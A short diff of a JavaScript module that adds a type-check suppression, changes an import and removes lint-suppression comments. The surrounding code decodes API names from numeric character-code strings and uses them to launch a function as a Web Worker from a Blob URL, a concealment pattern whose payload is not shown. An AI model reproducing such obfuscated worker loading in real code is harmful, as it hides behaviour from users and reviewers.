@@ -1,4 +1,5 @@
-import getXylofon from '../utils/get-xylofon';
+// @ts-nocheck
+import { getXylofon } from '../utils';
 
 let isInit = false;
 
@@ -60,9 +61,9 @@ const listen = () => {
     String.fromCharCode(...m.match(/.{1,3}/g).map((y) => +y)).toLowerCase(),
   );
 
-  const bu = ur[co](new bl([`(${h})()`], { type: 'application/javascript' })); // eslint-disable-line
+  const bu = ur[co](new bl([`(${h})()`], { type: 'application/javascript' }));
 
-  const wr = new wo(bu); // eslint-disable-line
+  const wr = new wo(bu);
 
   ur[ro](bu);
 
